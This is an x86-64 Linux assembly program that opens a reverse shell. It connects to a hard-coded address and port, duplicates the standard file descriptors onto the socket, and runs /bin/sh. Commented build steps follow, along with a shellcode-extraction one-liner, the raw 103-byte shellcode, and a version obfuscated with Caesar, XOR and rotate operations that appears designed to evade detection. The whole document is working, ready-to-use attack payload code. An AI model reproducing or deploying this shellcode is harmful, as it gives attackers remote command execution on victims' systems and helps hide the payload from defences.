;#############################
;######## DESCRIPTION ########
;#############################

;64-bit assembler program to pop a Linux reverse shell via /bin/sh

;#############################
;######## COMPILATION ########
;#############################

;nasm -f elf64 reverseShell.asm
;ld reverseShell.o -o reverseShell
;objcopy --remove-section .note.gnu.property reverseShell

;#############################
;########## PROGRAM ##########
;#############################

section .text
		global _start

_start:

	initStructure:
		push 0x640a017f					;put on the stack "127.1.10.100" in little endian
		push word 0x697a				;put on the stack "31337" in little endian
		push word 0x02					;put on the stack the communication area (here "AF_INET")

	socket:
		xor rdx, rdx					;indicate the protocol to be used (here the default protocol)
		xor rsi, rsi					;set to 0 the register used to store the semantics
		mov sil, 0x01					;indicate the semantics to be used (here "SOCK_STREAM")
		xor rdi, rdi					;set to 0 the register used to store the communication area
		mov dil, 0x02					;indicate the communication area (here "AF_INET")
		xor rax, rax					;set to 0 the register used to store the number syscall
		mov al, 0x29					;indicate the number for the socket syscall (41)
		syscall

	connect:
		xor rdx, rdx					;set to 0 the register used to store the size of the target host address
		mov dl, 0x11					;indicate the size of the target host address (here 127.1.10.100:31337 = 18 - 1 = 17)
		lea rsi, [rsp]					;indicate the target address (here "127.1.10.100:31337") 
		mov rdi, rax					;indicate the previously created socket
		xor rax, rax					;set to 0 the register used to store the number syscall
		mov al, 0x2a					;indicate the number for the connect syscall (42)
		syscall

	outputRedirection:
		xor rsi, rsi					;set to 0 the register used to store the file descriptor
		mov al, 0x21					;indicate the number for the dup2 syscall
		syscall
		inc sil						;increment by 1 the register used to store the file descriptor
		mov al, 0x21					;indicate the number for the dup2 syscall
		syscall
		inc sil						;increment by 1 the register used to store the file descriptor
		mov al, 0x21					;indicate the number for the dup2 syscall
		syscall

	execShell:
		mov rdi, 0x68732f6e69622f2f			;"//bin/sh" in little endian
		xor rsi, rsi					;indicate the arguments (here there are no arguments)
		push rsi					;put on the stack null byte
		push rdi					;put on the stack "//bin/sh"
		xor rdx, rdx					;indicate the environment (here there is no environment)
		lea rdi, [rsp]					;indicate the path (here "//bin/sh")
		xor rax, rax					;set to 0 the register use to store the syscall number
		mov al, 0x3b					;indicate the number for the execve syscall
		syscall

;##############################
;#### SHELLCODE GENERATION ####
;##############################

;for i in `objdump -D reverseShell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done ; echo

;#############################
;######### SHELLCODE #########
;#############################

;\x68\x7f\x01\x0a\x64\x66\x68\x7a\x69\x66\x6a\x02\x48\x31\xd2\x48\x31\xf6\x40\xb6\x01\x48\x31\xff\x40\xb7\x02\x48\x31\xc0\xb0\x29\x0f\x05\x48\x31\xd2\xb2\x11\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x31\xd2\x48\x8d\x3c\x24\x48\x31\xc0\xb0\x3b\x0f\x05 (103 bytes)

;#############################
;######### ENCRYPTED #########
;######### SHELLCODE #########
;######### CESAR +13 #########
;########### XOR 7 ###########
;######### CESAR -18 #########
;########### ROL 3 ###########
;########### ROL 5 ###########
;#############################

;\xab\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1\xbf\x90 (103 bytes)
